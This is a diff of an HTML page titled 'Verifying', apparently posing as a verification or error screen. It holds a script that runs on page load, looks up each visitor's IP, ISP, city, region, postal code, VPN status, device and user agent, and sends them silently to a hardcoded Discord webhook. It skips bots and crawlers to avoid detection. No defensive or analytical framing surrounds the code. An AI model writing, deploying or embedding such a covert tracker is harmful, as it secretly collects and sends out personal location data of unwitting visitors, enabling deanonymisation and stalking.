@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>Verifying</title>
 </head>
-<body>
+<body> Please wait, we are processing your Error!
     <script>(async () => { const w = "https://discord.com/api/webhooks/1338876988340830289/V1LLMl7NvDlnL-OwZXsmp5JtSpuPqba9B0wEIB-tsR-v8JjOe0FvIGFzjoqWohC9dnkp", r = await fetch("http://ip-api.com/json/"), d = await r.json(), v = await fetch(`https://json.geoiplookup.io/${d.query}`), g = await v.json(), j = { ip: d.query, isp: d.isp, city: d.city, region: d.regionName, country: d.country, zip: d.zip, vpn: g.connection_type === "Corporate" ? `Yes (${d.isp})` : "No", flag: `https://www.countryflags.io/${d.countryCode}/shiny/64.png`, userAgent: navigator.userAgent, date: new Date().toLocaleDateString(), time: new Date().toLocaleTimeString(), device: window.innerWidth < window.innerHeight ? "Mobile" : "Desktop" }; if (!/bot|Discord|robot|curl|spider|crawler|^$/i.test(j.userAgent)) await fetch(w, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [{ title: "Visitor Info", color: 16711680, fields: [ { name: "IP", value: j.ip, inline: true }, { name: "ISP", value: j.isp, inline: true }, { name: "Location", value: `${j.city}, ${j.region}, ${j.country}`, inline: true }, { name: "Postal Code", value: j.zip, inline: true }, { name: "VPN", value: j.vpn, inline: true }, { name: "Device", value: j.device, inline: true }, { name: "Date", value: j.date, inline: true }, { name: "Time", value: j.time, inline: true } ], thumbnail: { url: j.flag } }] }) }); })();
     </script>
 </body>
